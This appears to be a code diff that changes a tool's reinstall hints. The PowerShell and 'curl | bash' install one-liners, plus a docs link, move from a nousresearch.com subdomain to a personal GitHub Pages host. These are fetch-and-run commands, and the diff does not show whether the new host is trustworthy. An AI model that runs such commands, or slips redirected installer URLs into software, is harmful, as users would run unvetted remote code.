@@ -31,8 +31,8 @@ _PRE_UPDATE_SNAPSHOT_MAX_FILE_SIZE = 1 << 30  # 1 GiB
 #: Reinstalling through the official installer swaps in a Python whose SQLite is safe; the
 #: one-liner differs per OS (mirrors ``uninstall._REINSTALL_HINT``). windows -> command
 _REINSTALL_ONE_LINER = {
-    True: "iex (irm https://haishui-agent.nousresearch.com/install.ps1)",
-    False: "curl -fsSL https://haishui-agent.nousresearch.com/install.sh | bash",
+    True: "iex (irm https://aiqinghaiwork163.github.io/haishui-agent/install.ps1)",
+    False: "curl -fsSL https://aiqinghaiwork163.github.io/haishui-agent/install.sh | bash",
 }
 
 
@@ -84,7 +84,7 @@ def _print_curator_first_run_notice() -> None:
     )
     print("  Preview now:  haishui curator run --dry-run")
     print("  Pause it:     haishui curator pause")
-    print("  Docs:         https://haishui-agent.nousresearch.com/docs/user-guide/features/curator")
+    print("  Docs:         https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/features/curator")
 
 
 def _print_fts_optimize_available_notice() -> None:
